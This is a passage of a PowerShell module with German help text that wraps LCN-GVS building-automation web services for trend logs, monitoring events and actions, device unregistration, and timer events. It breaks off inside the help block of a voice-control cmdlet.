    [CmdletBinding(DefaultParameterSetName='Standard', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Open-LCNGVSTrendLog',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([String])]
    Param
    (
        [Parameter(Mandatory=$true,
                ValueFromPipelineByPropertyName=$true,
                Position=0)]
        [int] $busId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=1)]
        [int] $segId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=2)]
        [int] $modId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=3)]
        [sring] $source,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=4)]
        [int] $logPeriodDays,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=5)]
        [int] $inactivityTimeoutSecs
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.OpenLCNGVSTrendLog))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Guid = $Script:Tableau1Svc.OpenTrendLog($busId,$segId,$modId,$source,$logPeriodDays,$inactivityTimeoutSecs)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $Guid
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

function Close-LCNGVSTrendLog
{
    [CmdletBinding(DefaultParameterSetName='Standard', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Close-LCNGVSTrendLog',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    Param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0)]
        [sring] $Id
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.CloseLCNGVSTrendLog))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    [bool] $bool = $Script:Tableau1Svc.CloseTrendLog($Id)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $bool
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

function Get-LCNGVSTrendLogValues
{
    [CmdletBinding(DefaultParameterSetName='Standard', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSTrendLogValues',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Tableau.TrendLog])]
    Param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0)]
        [string] $Id,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=1)]
        [DateTime] $start,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=2)]
        [DateTime] $end,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=3)]
        [LCNGVS.Tableau.ScaleUnit] $scaleUnit,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=4)]
        [int] $intervalSecs
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.GetLCNGVSTrendLogValues))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $TrendLog = $Script:Tableau1Svc.GetTrendLogValues($Id,$start,$end,$scaleUnit,$intervalSecs)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $TrendLog
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

function Get-LCNGVSTrendLogValuesMultiple
{
    [CmdletBinding(DefaultParameterSetName='Standard', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSTrendLogValuesMultiple',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Tableau.TrendLog])]
    Param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0)]
        [LCNGVS.Tableau.TrendLogRange[]] $TrendLogRanges,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=1)]
        [LCNGVS.Tableau.ScaleUnit] $scaleUnit,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=2)]
        [int] $intervalSecs
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.GetLCNGVSTrendLogValuesMultiple))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $TrendLog = $Script:Tableau1Svc.GetTrendLogValuesMultiple($TrendLogRanges,$scaleUnit,$intervalSecs)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $TrendLog
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

#endregion

# -----------------------------------------------
# Webservice: MonitoringServer - Ereignismelder
# -----------------------------------------------
#region WebService: MonitoringServer

# -----------------------------------------------
# MonitoringEvent - Ereignis (benoetigt Lizenzen)
# -----------------------------------------------

<#
    .SYNOPSIS
        Erzeugt ein neuen Ereignismelder.
    .DESCRIPTION
       Das LCN-GVS verfuegt ueber einen Ereignismelder, der Zustaende im LCN-Bus ueberwacht und beim Eintreten von vordefinierten Ereignissen entsprechende Aktionen ausfuehrt.
       Mit diesem Befehl koennen Sie ein neuen Ereignismelder erzeugen.
       
       Fuer den Ereignismelder sind Lizenzen erforderlich (entsprechend der Anzahl eingerichteter Ereignisse).
    .EXAMPLE
        New-LCNGVSMonitoringEvent
    .LINK
        New-LCNGVSMonitoringEvent
        Get-LCNGVSMonitoringEvent
        Set-LCNGVSMonitoringEvent
        Add-LCNGVSMonitoringEvent
        Remove-LCNGVSMonitoringEvent
#>
function New-LCNGVSMonitoringEvent
{
    throw "This function is not implemented."
}

<#
    .SYNOPSIS
        Ruft die im LCN-GVS eingerichteten Ereignismelder ab.
    .DESCRIPTION
       Das LCN-GVS verfuegt ueber einen Ereignismelder, der Zustaende im LCN-Bus ueberwacht und beim Eintreten von vordefinierten Ereignissen entsprechende Aktionen ausfuehrt.
       Mit diesem Befehl koennen Sie die im LCN-GVS eingerichteten Ereignismelder abrufen.
       
       Fuer den Ereignismelder sind Lizenzen erforderlich (entsprechend der Anzahl eingerichteter Ereignisse).
    .EXAMPLE
        Get-LCNGVSMonitoringEvent
    .EXAMPLE
        Get-LCNGVSMonitoringEvent -all
    .EXAMPLE
        Get-LCNGVSMonitoringEvent -id 8eaf4ba7-aeb9-4f3c-8aa6-c355ea951838
    .LINK
        New-LCNGVSMonitoringEvent
        Get-LCNGVSMonitoringEvent
        Set-LCNGVSMonitoringEvent
        Add-LCNGVSMonitoringEvent
        Remove-LCNGVSMonitoringEvent
#>
function Get-LCNGVSMonitoringEvent
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSMonitoringEvent',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.MonitoringServer.MonitoringEvent[]])]
    param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Id')]
        [SupportsWildcards()]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $Id,

        [Parameter(Position=0,
                   ParameterSetName='Default')]
        [Switch] $all
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MonitoringServer", "Get Monitoring Events"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Events = $Script:MonitoringServer1Svc.GetMonitoringEvents()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    if ($pscmdlet.ParameterSetName -eq 'Id')
                    {
                        $Events | Where-Object -Property id -like -Value $Id
                    }
                    else
                    {
                        $Events
                    }
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }    
}

<#
    .SYNOPSIS
       Fuegt hinzu oder aendert den Ereignismelder im LCN-GVS.
    .DESCRIPTION
       Das LCN-GVS verfuegt ueber einen Ereignismelder, der Zustaende im LCN-Bus ueberwacht und beim Eintreten von vordefinierten Ereignissen entsprechende Aktionen ausfuehrt.
       Mit diesem Befehl koennen Sie den uebergebenen im LCN-GVS eingerichteten Ereignismelder aendern oder fuegen einen neuen hinzu.
       
       Fuer den Ereignismelder sind Lizenzen erforderlich (entsprechend der Anzahl eingerichteter Ereignisse).
    .EXAMPLE
        Set-LCNGVSMonitoringEvent -Event $Event
    .EXAMPLE
        Add-LCNGVSMonitoringEvent -Event $Event
    .LINK
        New-LCNGVSMonitoringEvent
        Get-LCNGVSMonitoringEvent
        Set-LCNGVSMonitoringEvent
        Add-LCNGVSMonitoringEvent
        Remove-LCNGVSMonitoringEvent
#>
function Set-LCNGVSMonitoringEvent # Alias: Add-LCNGVSMonitoringEvent
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Set-LCNGVSTimerEvent',
                  ConfirmImpact='Medium')]
    [Alias('Add-LCNGVSMonitoringEvent')]
    [OutputType([bool])]
    param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [LCNGVS.MonitoringServer.MonitoringEvent] $Event
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MonitoringServer", "Set Monitoring Event"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:MonitoringServer1Svc.AddOrReplaceMonitoringEvent($Event)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
       Loescht den Ereignismelder im LCN-GVS.
    .DESCRIPTION
       Das LCN-GVS verfuegt ueber einen Ereignismelder, der Zustaende im LCN-Bus ueberwacht und beim Eintreten von vordefinierten Ereignissen entsprechende Aktionen ausfuehrt.
       Mit diesem Befehl koennen Sie den uebergebenen im LCN-GVS eingerichteten Ereignismelder loeschen.
       
       Fuer den Ereignismelder sind Lizenzen erforderlich (entsprechend der Anzahl eingerichteter Ereignisse).
    .EXAMPLE
        Remove-LCNGVSMonitoringEvent -id 8eaf4ba7-aeb9-4f3c-8aa6-c355ea951838
    .LINK
        New-LCNGVSMonitoringEvent
        Get-LCNGVSMonitoringEvent
        Set-LCNGVSMonitoringEvent
        Add-LCNGVSMonitoringEvent
        Remove-LCNGVSMonitoringEvent
#>
function Remove-LCNGVSMonitoringEvent
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSMonitoringActions',
                  ConfirmImpact='High')]
    [Alias()]
    [OutputType([bool])]
    param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Id')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $Id
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MonitoringServer", "Remove a Monitoring Event"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:MonitoringServer1Svc.DeleteMonitoringEvent($Id)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }    
}

# -----------------------------------------------
# MonitoringAction - Ausloeser, Aktion
# -----------------------------------------------

function New-LCNGVSMonitoringAction
{
    throw "This function is not implemented."
}

function Get-LCNGVSMonitoringAction
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSMonitoringActions',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.MonitoringServer.AMonitoringAction[]])]
    param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Id')]
        [SupportsWildcards()]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $Id,

        [Parameter(Position=0,
                   ParameterSetName='Default')]
        [Switch] $all
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MonitoringServer", "Get Monitoring Action"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Actions = $Script:MonitoringServer1Svc.GetMonitoringActions()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    if ($pscmdlet.ParameterSetName -eq 'Id')
                    {
                        $Actions | Where-Object -Property id -like -Value $Id
                    }
                    else
                    {
                        $Actions
                    }
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }    
}

function Set-LCNGVSMonitoringAction # Alias: Add-LCNGVSMonitoringAction
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Set-LCNGVSMonitoringAction',
                  ConfirmImpact='Medium')]
    [Alias('Add-LCNGVSMonitoringAction')]
    [OutputType([bool])]
    param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [LCNGVS.MonitoringServer.AMonitoringAction] $Action
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MonitoringServer", "Set Monitoring Action"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:MonitoringServer1Svc.AddOrReplaceMonitoringAction($Action)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

function Remove-LCNGVSMonitoringAction
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSMonitoringActions',
                  ConfirmImpact='High')]
    [Alias()]
    [OutputType([bool])]
    param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Id')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $Id
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MonitoringServer", "Remove a monitoring Action"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:MonitoringServer1Svc.DeleteMonitoringAction($Id, $true)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }    
}

# ------------------------------------------------
# PushNotification
# -----------------------------------------------

function Unregister-Device
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Unregister-Device',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([Bool])]
    param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $DeviceId,

        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=1,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $DeviceType
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MonitoringServer", $LocalizedData.UnregisterDevice))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:MonitoringServer1Svc.DeregisterDevice($DeviceType, $DeviceId)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

#endregion

# -----------------------------------------------
# Webservice: Timer - Zeitsteuerung, Zeitschaltuhr
# -----------------------------------------------
#region WebService: Timer

<#
    .SYNOPSIS
        Erstellt ein neues Zeitschaltuhr-Ereignis.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie ein neues Zeitschaltuhr-Ereignis erstellen. 
    .EXAMPLE
        New-LCNGVSTimerEvent -Description "Es wird Zeit!"
    .LINK
        New-LCNGVSTimerEvent
        Get-LCNGVSTimerEvent
        Set-LCNGVSTimerEvent
        Add-LCNGVSTimerEvent
        Remove-LCNGVSTimerEvent
        Copy-LCNGVSTimerEvent
#>
function New-LCNGVSTimerEvent
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/New-LCNGVSTimerEvent',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Timer.TimerEvent])]
    param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [string] $Description,

        [LCNGVS.Timer.Time[]] $Times,
        [System.Object[]] $Actions,
        [bool] $Enabled
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Timer", "Create a new timer event"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $TimerEvent = [LCNGVS.Timer.TimerEvent]::new()
                    $TimerEvent.id = [GUID]::NewGuid()
                    $TimerEvent.Times = $Times
                    $TimerEvent.Action = $Actions
                    $TimerEvent.Description = $Description
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $TimerEvent
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }  
}

<#
    .SYNOPSIS
        Rufen Sie ein oder mehrere Zeitschaltuhr-Ereignisse ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie ein oder mehrere Zeitschaltuhr-Ereignisse abrufen.
    .EXAMPLE
        Get-LCNGVSTimerEvent
    .EXAMPLE
        Get-LCNGVSTimerEvent -all
    .EXAMPLE
        Get-LCNGVSTimerEvent -Id 9249fe1a-e738-4f73-ab16-e2e00809b482
    .LINK
        New-LCNGVSTimerEvent
        Get-LCNGVSTimerEvent
        Set-LCNGVSTimerEvent
        Add-LCNGVSTimerEvent
        Remove-LCNGVSTimerEvent
        Copy-LCNGVSTimerEvent
#>
function Get-LCNGVSTimerEvent
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSTimerEvent',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Timer.TimerEvent[]])]
    param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Id')]
        [SupportsWildcards()]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $Id,

        [Parameter(Position=0,
                   ParameterSetName='Default')]
        [Switch] $all
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Timer", "Get timer events"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Events = $Script:Timer1Svc.GetTimerEvents()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    if ($pscmdlet.ParameterSetName -eq 'Id')
                    {
                        $Events | Where-Object -Property id -like -Value $Id
                    }
                    else
                    {
                        $Events
                    }
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }    
}

<#
    .SYNOPSIS
        Fuegen Sie ein neues Zeitschaltuhr-Ereignis hinzu oder aendern Sie ein vorhandenes.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie ein neues Zeitschaltuhr-Ereignis hinzufuegen oder ein vorhandenes aendern.
    .EXAMPLE
        Set-LCNGVSTimerEvent -Event $TimerEvent
    .EXAMPLE
        Add-LCNGVSTimerEvent -Event (New-LCNGVSTimerEvent -Description "Es wird Zeit!")
    .LINK
        New-LCNGVSTimerEvent
        Get-LCNGVSTimerEvent
        Set-LCNGVSTimerEvent
        Add-LCNGVSTimerEvent
        Remove-LCNGVSTimerEvent
        Copy-LCNGVSTimerEvent
#>
function Set-LCNGVSTimerEvent # Alias: Add-LCNGVSTimerEvent
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Set-LCNGVSTimerEvent',
                  ConfirmImpact='Medium')]
    [Alias('Add-LCNGVSTimerEvent')]
    [OutputType([bool])]
    param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [LCNGVS.Timer.TimerEvent] $Event
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Timer", "Set a timer event"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:Timer1Svc.AddOrReplaceTimer($Event)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }    
}

<#
    .SYNOPSIS
        Loeschen Sie ein vorhandenes Zeitschaltuhr-Ereignis.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie ein vorhandenes Zeitschaltuhr-Ereignis loeschen.
    .EXAMPLE
        Remove-LCNGVSTimerEvent -Id 301c2bc9-5cee-4f73-9d88-9779719d7040
    .LINK
        New-LCNGVSTimerEvent
        Get-LCNGVSTimerEvent
        Set-LCNGVSTimerEvent
        Add-LCNGVSTimerEvent
        Remove-LCNGVSTimerEvent
        Copy-LCNGVSTimerEvent
#>
function Remove-LCNGVSTimerEvent
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Remove-LCNGVSTimerEvent',
                  ConfirmImpact='High')]
    [Alias()]
    [OutputType([bool])]
    param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [string] $Id
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Timer", "remove timer event"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:Timer1Svc.DeleteTimer($Id)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }    
}

<#
    .SYNOPSIS
        Kopieren Sie ein vorhandenes Zeitschaltuhr-Ereignis.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie ein vorhandenes Zeitschaltuhr-Ereignis kopieren.
        
        Hinweis: Es wird direkt als neues Ereignis registriert.

    .EXAMPLE
        Copy-LCNGVSTimerEvent -Id 301c2bc9-5cee-4f73-9d88-9779719d7040
    .LINK
        New-LCNGVSTimerEvent
        Get-LCNGVSTimerEvent
        Set-LCNGVSTimerEvent
        Add-LCNGVSTimerEvent
        Remove-LCNGVSTimerEvent
        Copy-LCNGVSTimerEvent
#>
function Copy-LCNGVSTimerEvent
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Copy-LCNGVSTimerEvent',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Timer.TimerEvent])]
    param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Id')]
        [SupportsWildcards()]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $Id
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Timer", "Get timer events"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $TimerEvent = $Script:Timer1Svc.GetTimerEvents() | Where-Object -Property id -like -Value $Id
                    $TimerEvent.ID = [GUID]::NewGuid()
                    $Result = Set-LCNGVSTimerEvent -Event $TimerEvent                
                    if ($Result -eq $true)
                    {
                        Get-LCNGVSTimerEvent -Id $TimerEvent.ID
                    }
                    else
                    {
                        Write-Error -Message "Internal Error."
                    }
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }    
}

#endregion

# -----------------------------------------------
# Webservice: AppSiri - Sprachsteuerung
# -----------------------------------------------
#region WebService: AppSiri

<#
    .SYNOPSIS
        Ruft das SiriItemWebService-Dictionary ab.  
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die Sprachbefehle aus dem Dictionary der Sprachsteuerung abrufen.
    .PARAMETER itemTitle
        Gibt den Schluesselbefehl an.
    .EXAMPLE
        Get-LCNGVSAppSiriItem
    .EXAMPLE
        Get-LCNGVSAppSiriItem -all
